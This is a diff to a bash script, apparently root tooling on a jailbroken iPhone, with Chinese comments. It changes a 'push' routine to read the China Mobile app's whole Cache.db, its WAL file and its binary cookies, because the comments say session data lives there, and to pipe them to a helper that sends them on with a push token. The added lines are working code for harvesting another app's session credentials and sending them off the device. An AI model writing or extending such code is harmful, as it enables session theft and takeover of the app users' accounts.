@@ -167,9 +167,20 @@ fire() {
         # ★ 2026-11-14：helper 这个 Theos TOOL 读不了文件系统，所以
         #   ① cookie 由这里（bash/root，读文件正常）cat 出来从 stdin 喂进去；
         #   ② 推送令牌从环境变量传。
-        _ck="$c/Library/Cookies/Cookies.binarycookies"
         _tok=$(cat "$DIR/cred_push.token" 2>/dev/null)
-        if [ -f "$_ck" ] && CREDD_TOKEN="$_tok" run_to "${CREDDAEMON_PUSH_TIMEOUT:-25}" "$PUSH"                 --stdin --id "$cid" < "$_ck" >> "$DIR/push.log" 2>&1; then
+        # ★ 2026-11-15：会话根本不在 binarycookies 里（实测只有 cmicapm 两条），
+        #   全在 Cache.db / Cache.db-wal；而且新会话可能落在 WAL 中段（实测距尾 1.2MB），
+        #   尾部 256KB 读不到。所以这里喂 **整份 DB + 整份 WAL + binarycookies**，
+        #   顺序 = 旧→新，配合 helper「越靠后越新」的排序。
+        _db="$c/Library/Caches/cn.10086.app/Cache.db"
+        _wal="$c/Library/Caches/cn.10086.app/Cache.db-wal"
+        _ck="$c/Library/Cookies/Cookies.binarycookies"
+        _have=0
+        [ -f "$_db" ] && _have=1
+        [ -f "$_wal" ] && _have=1
+        [ -f "$_ck" ] && _have=1
+        if [ "$_have" = "1" ] && { cat "$_db" 2>/dev/null; cat "$_wal" 2>/dev/null; cat "$_ck" 2>/dev/null; } \
+                | CREDD_TOKEN="$_tok" run_to "${CREDDAEMON_PUSH_TIMEOUT:-25}" "$PUSH" --stdin --id "$cid" >> "$DIR/push.log" 2>&1; then
             log "push  $cid OK（直推，不切 App）"
             return 0
         fi
